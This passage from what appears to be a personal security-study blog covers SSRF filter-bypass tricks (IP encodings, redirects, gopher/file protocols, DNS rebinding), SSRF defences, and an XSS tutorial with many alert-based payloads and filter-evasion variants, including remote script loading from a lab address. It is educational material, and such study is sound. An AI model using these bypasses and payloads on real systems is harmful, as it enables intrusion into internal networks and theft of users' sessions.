<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure>
<p>这些表达方式都能被curl命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制0x0A000003表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在20前面加个0就会变成8进制，比如<code>http://01200000003实际上还是http://10.0.0.3</code><br>上面两个表达方式，PHP 的 curl 模块能解析出来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure>

<h2 id="重定向绕过-amp-短网址绕过"><a href="#重定向绕过-amp-短网址绕过" class="headerlink" title="重定向绕过&amp;短网址绕过"></a>重定向绕过&amp;短网址绕过</h2><p>一般来说，PHP里的重定向长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpfunction redirect($url)&#123;    header(&quot;Location: $url&quot;);    exit();&#125;</span><br></pre></td></tr></table></figure>
<p>如果192.168.0.1.xip.io都被过滤了，但是重定向没有被控制；你可以去<strong>TINYURL</strong>生成一个短URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问短URL的流程就是</span><br><span class="line">https://tinyurl.com/4czmrv9d-&gt;302跳转-&gt;成功访问192.168.0.1</span><br><span class="line">这样就成功绕过了检查</span><br></pre></td></tr></table></figure>

<h2 id="冷门协议绕过"><a href="#冷门协议绕过" class="headerlink" title="冷门协议绕过"></a>冷门协议绕过</h2><p>如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://系列zip:// &amp; bzip2:// &amp; zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://</span><br></pre></td></tr></table></figure>

<h2 id="特殊用法绕过"><a href="#特殊用法绕过" class="headerlink" title="特殊用法绕过"></a>特殊用法绕过</h2><p>下面这俩可以试试绕过127.0.0.1:80，不一定有效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[::]:80/ http://0000::1:80/http://0/</span><br></pre></td></tr></table></figure>
<p>中文句号也可以试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192。168。0。1</span><br></pre></td></tr></table></figure>

<h2 id="xip-io和xip-name"><a href="#xip-io和xip-name" class="headerlink" title="xip.io和xip.name"></a>xip.io和xip.name</h2><p><strong>xip.io</strong> 是一个提供通配符 DNS 解析的魔法域名。你可以无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。<br><strong>xip.name</strong> 是受 xip.io 启发，使用 Golang 开发的一个支持通配符的 DNS 服务器。<br><a href="https://cloud.tencent.com/developer/article/1825757">详细解释</a></p>
<h2 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6"></a>利用IPv6</h2><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::] 0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
<h2 id="利用IDN"><a href="#利用IDN" class="headerlink" title="利用IDN"></a>利用IDN</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。<br>在这些字符中，部分字符会在访问时做一个等价转换。<br>可在该网站挑选合适的字符进行替代：<a href="https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF">替代字符</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ⓌⓌⓌ.ⓑⓐⓘⓓⓤ.ⓒⓞⓜ 完全等价于 https://www.baidu.com</span><br></pre></td></tr></table></figure>
<p>当然，适用于域名而不适用与直接IP访问</p>
<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p>
<ul>
<li>判定逻辑：<br>判定所给的IP或者域名解析后的IP是否在黑名单中<br>若在，退出报错<br>若不在，再次访问所给的IP或者域名解析后的IP；执行后续业务模块<br>所以思路很简单：只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换<br>效果类比：访问wwfcww.xyz这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1<br>这个操作，就叫做DNS重绑定，如此一来便可进行SSRF攻击。</li>
</ul>
<h1 id="SSRF的防御"><a href="#SSRF的防御" class="headerlink" title="SSRF的防御"></a>SSRF的防御</h1><ul>
<li>限制协议<br>仅允许http&#x2F;https请求</li>
<li>限制IP<br>避免应用被用来获取内网数据，攻击内网</li>
<li>限制端口<br>限制请求的端口为http常用的端口，比如80, 443, 8080, 8090</li>
<li>过滤返回信息<br>验证远程服务器对请求的响应是比较简单的方法</li>
<li>统一错误信息<br>避免用户可以根据错误信息来判断远端服务器的端口状态</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>仍然有很多不太清晰的地方，主要在协议和DNS重定向方面。以后刷题来弥补吧。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a><br><a href="https://www.anquanke.com/post/id/262430">学习一年的SSRF总结</a></p>
]]></content>
      <categories>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <url>/2022/12/02/XSS/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。</p>
<span id="more"></span>
<h1 id="XSS-漏洞概述"><a href="#XSS-漏洞概述" class="headerlink" title="XSS 漏洞概述"></a>XSS 漏洞概述</h1><h2 id="XSS-简单介绍"><a href="#XSS-简单介绍" class="headerlink" title="XSS 简单介绍"></a>XSS 简单介绍</h2><p>XSS又名CSS(Cross Site Scripting)，即跨站脚本攻击。<br>XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。在留言板，聊天室等收集用户输入的地方，只要没有对用户输入进行严格过滤，都有可能被注入XSS代码。<br>从上述内容可知，XSS属于客户端攻击，受害者最终是用户。XSS也可以攻击服务器端，攻击者可能靠管理员身份作为跳板实施攻击。</p>
<h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般是在前端，JS代码能干什么，执行之后就会达到相应的效果</p>
<h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如php中的脚本的输出函数<br>常见的输出函数有：<code>print, print_r, echo, printf, sprintf, die, var_dump, var_export</code></p>
<h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>XSS利用JS代码实现攻击，有很多方法，以下列出常见几种：</p>
<ul>
<li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击</li>
<li>刷流量，执行弹窗广告</li>
</ul>
<h2 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h2><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
<h2 id="XSS-漏洞的验证"><a href="#XSS-漏洞的验证" class="headerlink" title="XSS 漏洞的验证"></a>XSS 漏洞的验证</h2><p>可以用一段简单的代码，检测和验证漏洞的存在，这样的代码叫做PoC(Proof of Concept)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoC          漏洞的验证与检测</span><br><span class="line">EXP          漏洞的完整利用工具</span><br><span class="line">shellcode    利用漏洞时所执行的代码</span><br><span class="line">payload      攻击载荷 -sqlmap中是攻击代码的模板  -msf中与shellcode类似，功能是建立与目标的连接</span><br><span class="line">验证XSS 漏洞存在的PoC如下</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;   常用</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS-攻击分类"><a href="#XSS-攻击分类" class="headerlink" title="XSS 攻击分类"></a>XSS 攻击分类</h2><h3 id="来自内部的攻击"><a href="#来自内部的攻击" class="headerlink" title="来自内部的攻击"></a>来自内部的攻击</h3><p>利用程序自身的漏洞，构造跨站语句。如：dvbbs的showerror.asp存在的跨站漏洞。</p>
<h3 id="来自外部的攻击"><a href="#来自外部的攻击" class="headerlink" title="来自外部的攻击"></a>来自外部的攻击</h3><p>主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
<h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><p>XSS漏洞可以分为三个类型：反射型XSS，存储型XSS，DOM型XSS</p>
<h2 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>反射型XSS是非持久性，参数型的跨站脚本。是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞<br>反射型XSS的JS代码在Web应用的参数(变量)中，如搜索框的反射型XSS。</p>
<h3 id="判断是否存在反射型XSS漏洞并利用"><a href="#判断是否存在反射型XSS漏洞并利用" class="headerlink" title="判断是否存在反射型XSS漏洞并利用"></a>判断是否存在反射型XSS漏洞并利用</h3><ol>
<li>判断有没有一些特殊字符<br>按照没有被过滤的字符进行代码构造。</li>
<li>注入代码<br>查看源代码进一步完善代码构造并尝试注入。</li>
<li>插入代码</li>
<li>利用XSS漏洞</li>
</ol>
<h2 id="存储型-持久化"><a href="#存储型-持久化" class="headerlink" title="存储型(持久化)"></a>存储型(持久化)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数(变量)中，而是写入数据库或文件等可以永久保存的介质中。最典型的例子就是留言板XSS，攻击者提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。<br><img src="/simg/xss_1.png" alt="存储型"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分<br>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，触发XSS靠的是浏览器的DOM解析，完全是客户端的事情。<br>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。<br>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="XSS-的构造"><a href="#XSS-的构造" class="headerlink" title="XSS 的构造"></a>XSS 的构造</h1><h2 id="利用-lt-gt-构造HTML-JS"><a href="#利用-lt-gt-构造HTML-JS" class="headerlink" title="利用&lt;&gt;构造HTML/JS"></a>利用&lt;&gt;构造HTML/JS</h2><pre><code>可以利用&lt;&gt;构造HTML标签和&lt;script&gt;标签
在测试页面提交参数 &lt;h1 style=&#39;color:red&#39;&gt;111&lt;/h1&gt;
提交 &lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>可以使用javascript:伪协议的方式构造XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(/xss/)        						在Edge浏览器URL中输入该代码能够运行</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     点击超链接即可触发XSS</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>            		IE6下测试成功</span><br></pre></td></tr></table></figure>

<h2 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h2><p>“事件驱动”是一种比较经典的编程思想。在网页中发生的事件（如：鼠标移动点击，键盘输入等），JS可以对这些事件进行响应。因此可通过事件触发JS函数，触发XSS。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">事件种类</span><br><span class="line">windows 事件  		对windows 对象触发的事件</span><br><span class="line">form 事件 			HTML表单内的动作触发事件</span><br><span class="line">Keyboard 事件 		键盘按键</span><br><span class="line">Mouse 事件 			由鼠标类似用户动作触发的事件</span><br><span class="line">Media 事件 			由多媒体触发的事件</span><br></pre></td></tr></table></figure>
<p>比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>  	// 标签引入一张图片，鼠标悬停于图片上时会触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onkeydown</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>			// 当点击键盘任意一个键时触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>					// 当图片未找到时触发XSS代码</span><br></pre></td></tr></table></figure>

<h2 id="利用CSS跨站-了解"><a href="#利用CSS跨站-了解" class="headerlink" title="利用CSS跨站(了解)"></a>利用CSS跨站(了解)</h2><p>可以利用CSS（层叠样式脚本）触发XSS。但方法古老，基本不适用，从学习角度了解。以下代码均在IE6下测试。</p>
<ul>
<li>行内样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image: url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>页内样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">javascript:alert(/xss</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>外部样式<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="其它标签以及手法"><a href="#其它标签以及手法" class="headerlink" title="其它标签以及手法"></a>其它标签以及手法</h2><p>可以使用其它标签触发XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>						载入页面时自动触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(/xss/)&quot;</span> <span class="attr">autofocus</span>&gt;</span>		当鼠标放在目标上时，自动聚焦并触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(hack)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">οnlοadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h1><p>可以将构造的XSS代码进行各种变形，以绕过XSS过滤器的检测。</p>
<h2 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h2><p>将payload进行大小写转换。但需要注意，只能对其中的HTML代码进行大小写转换，因为JS代码对大小写敏感。比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 				不能对alert进行大小写转换，因为是JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h2><p>HTML 语言对引号不敏感，但某些过滤函数敏感。因此不同过滤情况需要考虑使用单&#x2F;双引号或不使用引号。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="代替空格"><a href="#代替空格" class="headerlink" title="代替空格"></a>代替空格</h2><p>可以利用 <code>/  //  %0a  %0d  Table键</code> 代替空格</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;Img/sRc=&#x27;#&#x27;/Onerror=&#x27;alert(/xss/)&#x27;/&gt;</span><br></pre></td></tr></table></figure>

<h2 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h2><p>可以在一些位置添加Tab(水平制表符)和回车符，来绕过关键字检测。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>	=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 		// 不能强行打断Onerror</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">hREf</span>=<span class="string">&quot;j</span></span></span><br><span class="line"><span class="string"><span class="tag">a	v</span></span></span><br><span class="line"><span class="string"><span class="tag">a 	s</span></span></span><br><span class="line"><span class="string"><span class="tag">cript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h2><p>可以对标签属性值进行转码，用来绕过过滤。对应编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字母 	ASCII码 		十进制编码 	十六进制编码</span><br><span class="line">a 		97			&amp;#97; 		&amp;#x61;</span><br><span class="line">e 		101			&amp;#101; 		&amp;#x65;</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>Script:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另外，可以将以下字符插入到任意位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tab 	&amp;#9</span><br><span class="line">换行 	&amp;#10</span><br><span class="line">回车 	&amp;#13</span><br></pre></td></tr></table></figure>
<p>可以将以下字符插入到头部位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOH 	&amp;#01</span><br><span class="line">STX 	&amp;#02</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;<span class="symbol">&amp;#01;</span>j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>S<span class="symbol">&amp;#9;</span>c<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt; 	一次过滤的双写绕过</span><br></pre></td></tr></table></figure>

<h2 id="编码脚本代码绕过关键字过滤"><a href="#编码脚本代码绕过关键字过滤" class="headerlink" title="编码脚本代码绕过关键字过滤"></a>编码脚本代码绕过关键字过滤</h2><p>有时服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行。还有许多其它编码（URL，Base64,HTML等）可以尝试。<br>例如alert(1)使用unicode编码过后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(\u0061\u006c\u0065\u0072\u0074(1))</span><br></pre></td></tr></table></figure>

<h2 id="CSS中的变形"><a href="#CSS中的变形" class="headerlink" title="CSS中的变形"></a>CSS中的变形</h2><ul>
<li>使用全角字符<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">width</span>:e x p r e s s i o <span class="built_in">n</span>(<span class="built_in">alert</span>(/xss/))</span><br></pre></td></tr></table></figure></li>
<li>注释会被浏览器忽略<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">width</span>:expr<span class="comment">/*~*/</span><span class="built_in">ession</span>(<span class="built_in">alert</span>(/x~s~s/))</span><br></pre></td></tr></table></figure></li>
<li>样式表中的 <code>\</code> 和 <code>\0</code><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;<span class="keyword">@import</span> <span class="string">&#x27;javasc\ri\0pt:alert(&quot;xss&quot;)&#x27;</span>;&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Shellcode-的调用"><a href="#Shellcode-的调用" class="headerlink" title="Shellcode 的调用"></a>Shellcode 的调用</h1><p>shellcode就是在利用漏洞所执行的代码<br>完整的XSS攻击，会将shellcode存放在一定的地方，然后触发漏洞，调用shellcode</p>
<h2 id="远程调用JS"><a href="#远程调用JS" class="headerlink" title="远程调用JS"></a>远程调用JS</h2><p>可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.132.138/XSS-TEST/normal/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是比较常用的方式。xss.js的内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="windows-location-hash"><a href="#windows-location-hash" class="headerlink" title="windows.location.hash"></a>windows.location.hash</h2><p>可以使用js中的windows.location.hash 方法获取浏览器URL地址栏的XSS代码。类似于DOM型XSS，不容易被WAF检测到。<br>windows.location.hash会获取URL中的 <code>#</code> 后面的内容，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://domain.com/index.php#AJEST    windows.location.hash的值就是#AJEST</span><br></pre></td></tr></table></figure>
<p>所以可以构造如下代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?submit=submit&amp;xsscode=&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(/This is windows.location.hash/)</span><br></pre></td></tr></table></figure>
<p>直接提交到测试页面xss.php</p>
